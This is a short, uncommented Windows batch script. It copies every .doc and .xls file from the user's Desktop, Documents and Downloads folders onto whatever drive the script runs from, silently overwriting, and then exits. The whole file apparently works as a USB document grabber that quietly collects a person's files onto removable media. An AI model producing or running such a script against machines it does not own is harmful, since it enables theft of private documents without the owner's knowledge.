@echo off
set "current_directory=%cd%"
set "disk=%current_directory:~0,1%"
set source=%USERPROFILE%\Desktop
set source2=%USERPROFILE%\Documents
set source3=%USERPROFILE%\Downloads
set destination=%disk%:\copied
set extension=.doc
set extension2=.xls
xcopy "%source%\*%extension%" "%destination%" /S /Y
xcopy "%source2%\*%extension%" "%destination%" /S /Y
xcopy "%source3%\*%extension%" "%destination%" /S /Y
xcopy "%source%\*%extension2%" "%destination%" /S /Y
xcopy "%source2%\*%extension2%" "%destination%" /S /Y
xcopy "%source3%\*%extension2%" "%destination%" /S /Y
exit